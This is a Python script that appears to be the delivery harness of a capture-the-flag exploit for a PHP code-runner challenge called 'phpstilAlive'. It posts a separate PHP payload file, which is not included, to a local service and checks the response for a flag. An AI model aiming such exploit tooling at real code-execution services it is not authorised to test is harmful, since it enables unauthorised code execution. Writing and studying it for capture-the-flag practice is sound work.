#!/usr/bin/env python3
import argparse
import html as html_lib
import re
import sys
import urllib.request
import uuid
from pathlib import Path


def extract_output(html: str) -> str:
    match = re.search(r'<pre class="out">(.*?)</pre>', html, re.S)
    if not match:
        return html
    return html_lib.unescape(match.group(1))


def main() -> int:
    parser = argparse.ArgumentParser(description='Submit PHP payload to the code runner.')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=18080)
    parser.add_argument('--payload', default=str(Path(__file__).with_name('payload.min.php')))
    args = parser.parse_args()

    payload_path = Path(args.payload)
    code = payload_path.read_text(encoding='utf-8')
    boundary = '----phpstilAlive' + uuid.uuid4().hex
    body = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="code"\r\n'
        '\r\n'
    ).encode() + code.encode() + f'\r\n--{boundary}--\r\n'.encode()
    req = urllib.request.Request(
        f'http://{args.host}:{args.port}/',
        data=body,
        headers={
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'phpstilAlive-exp',
        },
    )

    with urllib.request.urlopen(req, timeout=120) as resp:
        html = resp.read().decode('utf-8', 'replace')

    output = extract_output(html)
    print(output)
    return 0 if 'flag{' in output else 1


if __name__ == '__main__':
    sys.exit(main())
